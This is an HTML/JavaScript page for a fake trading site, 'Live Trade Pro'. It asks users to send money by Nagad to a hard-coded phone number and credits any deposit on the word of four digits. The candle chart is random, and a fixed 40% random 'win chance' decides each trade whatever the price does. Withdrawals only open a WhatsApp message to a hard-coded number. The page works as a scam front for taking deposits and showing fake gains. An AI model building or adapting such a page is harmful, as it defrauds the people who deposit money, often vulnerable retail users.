<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Live Trade Pro</title>
<style>
body {
  margin: 0;
  font-family: Arial, sans-serif;
  background: #0d1117;
  color: #fff;
}
.header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 10px;
  background: #161b22;
}
.balance {
  font-size: 18px;
  color: #2ecc71;
  font-weight: bold;
}
.btn {
  padding: 8px 15px;
  border: none;
  border-radius: 5px;
  cursor: pointer;
  font-weight: bold;
  margin: 5px;
}
.deposit { background: #2ecc71; }
.withdraw { background: #e74c3c; }
.up { background: #2ecc71; width: 48%; }
.down { background: #e74c3c; width: 48%; }

.box {
  padding: 15px;
  text-align: center;
  background: #161b22;
  margin: 10px;
  border-radius: 8px;
  display: none;
}
input, select {
  padding: 10px;
  border-radius: 5px;
  border: 1px solid #30363d;
  background: #0d1117;
  color: #fff;
  width: 90%;
  margin: 5px 0;
}
.note {
  font-size: 13px;
  color: #8b949e;
}
.candle-area {
  height: 250px;
  background: #0d1117;
  position: relative;
  overflow: hidden;
  border-top: 1px solid #30363d;
  border-bottom: 1px solid #30363d;
}
.candle {
  width: 8px;
  position: absolute;
  bottom: 0;
}
.green { background: #2ecc71; }
.red { background: #e74c3c; }
.mark {
  position: absolute;
  width: 100%;
  height: 2px;
  background: #f39c12;
}
.timer {
  text-align: center;
  font-size: 20px;
  color: #f39c12;
  padding: 10px;
}
.history {
  padding: 15px;
  max-height: 200px;
  overflow-y: auto;
}
</style>
</head>
<body>

<div class="header">
  <div class="balance" id="balance">Balance: $0.00</div>
  <div>
    <button class="btn deposit" onclick="toggleBox('depositBox')">Deposit</button>
    <button class="btn withdraw" onclick="toggleBox('withdrawBox')">Withdraw</button>
  </div>
</div>

<div id="depositBox" class="box">
  <h3>Deposit</h3>
  <p class="note">Minimum 900 BDT. Send money to Nagad: <b>01819811370</b></p>
  <input type="number" id="depositAmount" placeholder="Amount BDT">
  <input type="text" id="last4" placeholder="Last 4 digits of sender number" maxlength="4">
  <button class="btn deposit" onclick="deposit()">Confirm Deposit</button>
</div>

<div id="withdrawBox" class="box">
  <h3>Withdraw</h3>
  <input type="number" id="withdrawAmount" placeholder="Amount USD">
  <input type="text" id="withdrawNumber" placeholder="Nagad Number">
  <button class="btn withdraw" onclick="withdraw()">Confirm Withdraw</button>
</div>

<div class="timer" id="timer">Time: 30s</div>
<div class="candle-area" id="chart"></div>

<div style="text-align:center; padding:10px;">
  <select id="timeSelect" onchange="changeTime()">
    <option value="30">30s</option>
    <option value="60">60s</option>
    <option value="600">10min</option>
  </select>
  <select id="amount">
    <option value="10">$10</option>
    <option value="20">$20</option>
    <option value="50">$50</option>
    <option value="100">$100</option>
  </select>
  <div style="margin-top:10px;">
    <button class="btn up" onclick="trade('up')">UP</button>
    <button class="btn down" onclick="trade('down')">DOWN</button>
  </div>
</div>

<div class="history">
  <h3>Trade History</h3>
  <div id="history"></div>
</div>

<script>
let balance = localStorage.getItem('balance') ? parseFloat(localStorage.getItem('balance')) : 0;
let history = JSON.parse(localStorage.getItem('history')) || [];
let tradeTime = 30;
let timerInterval;
let candles = [];
let currentPrice = 100;
let activeTrade = null;

function updateUI() {
  document.getElementById('balance').innerText = 'Balance: $' + balance.toFixed(2);
  document.getElementById('history').innerHTML = history.map(h => `<p>${h}</p>`).join('');
  localStorage.setItem('balance', balance);
  localStorage.setItem('history', JSON.stringify(history));
}

function toggleBox(id) {
  document.getElementById('depositBox').style.display = 'none';
  document.getElementById('withdrawBox').style.display = 'none';
  document.getElementById(id).style.display = 'block';
}

function deposit() {
  let amt = parseFloat(document.getElementById('depositAmount').value);
  let last4 = document.getElementById('last4').value;
  if(amt < 900) {
    alert('Minimum deposit 900 BDT');
    return;
  }
  if(last4.length != 4) {
    alert('Enter last 4 digits');
    return;
  }
  balance += amt;
  history.unshift(`Deposit: ${amt} BDT - Last4: ${last4}`);
  updateUI();
  alert('Deposit Successful! Balance added.');
  document.getElementById('depositAmount').value = '';
  document.getElementById('last4').value = '';
  document.getElementById('depositBox').style.display = 'none';
}

function withdraw() {
  let amt = parseFloat(document.getElementById('withdrawAmount').value);
  let num = document.getElementById('withdrawNumber').value;
  if(amt <= 0 || amt > balance) {
    alert('Invalid amount');
    return;
  }
  if(!num) {
    alert('Enter Nagad number');
    return;
  }
  balance -= amt;
  history.unshift(`Withdraw: $${amt} to ${num}`);
  updateUI();
  
  // Open WhatsApp
  let msg = `Withdraw Request\nAmount: $${amt}\nNagad Number: ${num}`;
  window.open(`https://wa.me/601123192967?text=${encodeURIComponent(msg)}`, '_blank');
  
  document.getElementById('withdrawAmount').value = '';
  document.getElementById('withdrawNumber').value = '';
  document.getElementById('withdrawBox').style.display = 'none';
}

function changeTime() {
  tradeTime = parseInt(document.getElementById('timeSelect').value);
  document.getElementById('timer').innerText = `Time: ${tradeTime >= 60 ? tradeTime/60 + 'min' : tradeTime + 's'}`;
}

function drawCandle() {
  let change = (Math.random() - 0.5) * 2;
  currentPrice += change;
  let isGreen = change >= 0;
  let height = Math.abs(change) * 20 + 20;
  
  candles.push({price: currentPrice, green: isGreen, height: height});
  if(candles.length > 30) candles.shift();
  
  let chart = document.getElementById('chart');
  chart.innerHTML = '';
  candles.forEach((c, i) => {
    let div = document.createElement('div');
    div.className = 'candle ' + (c.green ? 'green' : 'red');
    div.style.height = c.height + 'px';
    div.style.left = i * 12 + 'px';
    chart.appendChild(div);
  });
}

function startTimer() {
  let timeLeft = tradeTime;
  document.getElementById('timer').innerText = `Time: ${timeLeft}s`;
  clearInterval(timerInterval);
  timerInterval = setInterval(() => {
    timeLeft--;
    document.getElementById('timer').innerText = `Time: ${timeLeft}s`;
    if(timeLeft <= 0) {
      clearInterval(timerInterval);
      endTrade();
    }
  }, 1000);
}

function trade(type) {
  if(activeTrade) {
    alert('Trade already running');
    return;
  }
  let amt = parseFloat(document.getElementById('amount').value);
  if(amt > balance) {
    alert('Insufficient balance');
    return;
  }
  activeTrade = {type: type, amount: amt, startPrice: currentPrice};
  balance -= amt;
  updateUI();
  startTimer();
  alert(`${type.toUpperCase()} trade started for $${amt} - ${tradeTime}s`);
}

function endTrade() {
  if(!activeTrade) return;
  
  let win = Math.random() < 0.4; // 40% win chance
  let finalPrice = currentPrice;
  let result = '';
  
  // Mark the end point
  let mark = document.createElement('div');
  mark.className = 'mark';
  mark.style.bottom = ((finalPrice - 90) * 5) + 'px';
  document.getElementById('chart').appendChild(mark);
  
  if(win) {
    let profit = activeTrade.amount * 0.6;
    balance += activeTrade.amount + profit;
    result = `${activeTrade.type.toUpperCase()}: $${activeTrade.amount} - WIN +$${profit.toFixed(2)}`;
  } else {
    result = `${activeTrade.type.toUpperCase()}: $${activeTrade.amount} - LOSE -$${activeTrade.amount}`;
  }
  
  history.unshift(result);
  updateUI();
  activeTrade = null;
}

setInterval(drawCandle, 1000);
updateUI();
drawCandle();
</script>

</body>
</html>
